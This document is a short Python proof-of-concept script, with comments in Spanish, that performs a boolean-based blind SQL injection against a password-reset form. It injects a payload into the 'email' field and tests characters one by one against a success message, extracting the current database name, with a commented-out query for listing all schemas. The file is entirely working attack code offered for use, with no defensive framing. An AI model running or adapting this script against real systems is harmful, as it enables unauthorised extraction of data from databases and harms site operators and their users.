from pwn import *
import requests, sys, time, string, argparse

def main():
    parser = argparse.ArgumentParser(
        description = "PoC script",
        epilog = "Usage example: python blid_extractor.py -u http://127.0.0.1:8080/resetPassword.php"
    )

    # Definition of arguments
    parser.add_argument("-u", "--url", type=str, help="Target URL (http://example.com:8080/resetPassword.php)")

    args = parser.parse_args()

    # Basic validation
    if not args.url:
        parser.error("URL is required (-u)")

    return args.url

url = main()
characters = string.ascii_lowercase + string.digits + string.punctuation

# contenido a buscar en la base de datos, colocado en el condicional if para evaluar sus caracteres
search = "database()"
#search = "SELECT group_concat(schema_name) from information_schema.schemata"

# Se definen dos variables para detectar el fin de la cadena
data0 = ""
data1 = ""

p1 = log.progress("Brute Force")
p1.status("Working...")

time.sleep(1)

p2 = log.progress("Data")

position = 0
while True:
    position += 1
    for character in characters:
        #time.sleep(0.2)
        post_data = {"email": f"' or 1=1 AND if(SUBSTR(({search}),{position}, 1)='{character}', 1, 0)-- -"}

        #SELECT IF(SUBSTR(GROUP_CONCAT(schema_name), 1, 1) = 'm', 1, 0) FROM information_schema.schemata;

        p1.status(post_data['email'])

        r = requests.post(url, data = post_data)

        if "A password reset link has been sent to your email address." in r.text:
            
            data0 += character
            p2.status(data0)
            break

    if data0 == data1: break
    data1 = data0
